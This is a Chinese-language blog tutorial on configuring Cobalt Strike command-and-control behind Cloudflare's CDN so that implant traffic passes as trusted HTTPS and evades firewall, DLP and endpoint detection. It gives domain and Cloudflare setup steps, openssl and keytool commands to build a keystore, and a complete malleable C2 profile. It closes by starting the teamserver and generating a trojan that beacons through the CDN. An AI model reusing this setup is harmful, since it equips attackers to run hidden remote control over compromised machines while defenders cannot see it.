---
title: CS 域前置加密
published: 2025-07-26 17:25
tags: [安全, CS, 域前置, 免杀]
category: 网安
draft: false
---

# CS 域前置加密

## 0x00 介绍

```
域前置简介 域前置（Domain Fronting）基于 HTTPS 通用规避技术，也被称为域前端网络攻击技术。 这是一种用来隐藏 Metasploit、Cobalt Strike 等团队控制服务器流量，以此来一定程度绕过检查器或防火墙检测的技术，如 Amazon、Google、Akamai 等大型厂商会提供一些域前端技术服务。  域前置技术原理（CDN 分发） 通过 CDN 节点将流量转发到真实的 C2 服务器，其中 CDN 节点 IP 通过识别请求的 HOST 头进行流量转发，利用我们配置域名的高可信度，如我们可以设置一个微软的子域名，可以有效的躲避 DLP、agent 等流量检测。  工作原理（也就是 CDN 工作原理） 域前置的核心是 CDN CDN 工作原理： 同一个 IP 可以被不同的域名进行绑定加速，再通过 HTTP 请求包头里的 HOST 域名来确定访问哪一个。
```

域名1个，vps 1台 ==>c2 服务器

## 0x01 域名 & CDN

### 1、免费国外域名

去 freenom 申请个免费的顶级域名：

```html
https://www.freenom.com/zh/index.html?lang=zh
```

![1](/images/posts/cs-domain-fronting/1.png)

这里也可以使用其他的平台来申请，我使用的 `godaddy`，花了十几块……

### 2、Cloudflare 添加站点

按照引导步骤即可

![2](/images/posts/cs-domain-fronting/2.jpg)

需要注意的是这里要将 `NS` 服务器设置为 `cloudflare` 的，才能进行后面的配置

![3](/images/posts/cs-domain-fronting/3.jpg)

### 3、SSL/TLS 配置

`SSL/TLS` 改为灵活，因为完全在国内会非常慢

![4](/images/posts/cs-domain-fronting/4.jpg)

### 4、创建客户端证书

![5](/images/posts/cs-domain-fronting/5.png)

选择 `ECC`-> 创建证书

![6](/images/posts/cs-domain-fronting/6.png)

记下证书和密钥

![7](/images/posts/cs-domain-fronting/7.png)

### 6、缓存配置

![8](/images/posts/cs-domain-fronting/8.jpg)

### 7、规则配置

添加两个规则 -> 选择缓存级别 -> 选择绕过 -> 保存

```
domain/*
*.domain/*
```

![9](/images/posts/cs-domain-fronting/9.jpg)

这时候多地 `ping` 已经是有 `CDN` 的状态了，成功隐藏服务器地址

![10](/images/posts/cs-domain-fronting/10.jpg)

## 0x02 C2 服务端

### 1、创建 server.pem

粘贴刚刚保存的证书

![11](/images/posts/cs-domain-fronting/11.jpg)

### 2、创建 server.key

粘贴刚刚保存的私钥

![12](/images/posts/cs-domain-fronting/12.jpg)

### 3、生成 C2 证书

```
openssl pkcs12 -export -in server.pem -inkey server.key -out cfcert.p12 -name cloudflare_cert -passout pass:yftk123
```

### 4、创建一个 store

```
keytool -importkeystore -deststorepass yftk123 -destkeypass yftk123 -destkeystore cfcert.store -srckeystore cfcert.p12 -srcstoretype PKCS12 -srcstorepass yftk123 -alias cloudflare_cert
 
ps：这里的所有密码都要和上面的一致
```

### 5、创建修改保存 c2 配置文件 cdn.profile

```
https-certificate {
set keystore "cfcert.store";
set password "yftk123";
}
http-config {
header "Content-Type" "application";
}
http-stager {
set uri_x86 "/api/1";
set uri_x64 "/api/2";
client {
header "Host" "";}
server {
output{
print;
}
}
}
http-get {
set uri "/api/3";
client {
header "Host" "";
metadata {
base64;
header "Cookie";
}
}
server {
output{
print;
}
}
}
http-post {
set uri "/api/4";
client {
header "Host" "";
id {
uri-append;
}
output{
print;
}
}
server {
output{
print;
}
}
}
```

![13](/images/posts/cs-domain-fronting/13.jpg)

### 6、将文件上传至 VPS

添加可执行权限

![14](/images/posts/cs-domain-fronting/14.jpg)

### 7、检查配置

```
./c2lint cdn.profile
```

![15](/images/posts/cs-domain-fronting/15.png)

### 8、服务器防火墙

将防火墙策略都进行适当的开放，端口及协议

## 0x03 CS 启动

### 1、服务端启动

```
./teamserver VPS_IP password cdn.profile
```

### 2、客户端连接

```
注意 http port 端口只能设置成以下几个：
80,8080,8880,2052,2082,2086,2095
 
如果是 https 的监听端口只能设置成以下几个：
443,2053,2083,2087,2096,8443;
 
国内服务器没有备案，不能使用80、8080、443、8443端口提供服务。创建listener时要避开这些端口。
```

![16](/images/posts/cs-domain-fronting/16.jpg)

### 3、生成木马上线

![17](/images/posts/cs-domain-fronting/17.jpg)

![18](/images/posts/cs-domain-fronting/18.jpg)

同时 `wireshark` 抓包能够看到是 `HTTPS` 加密的，能够隐藏流量

![19](/images/posts/cs-domain-fronting/19.jpg)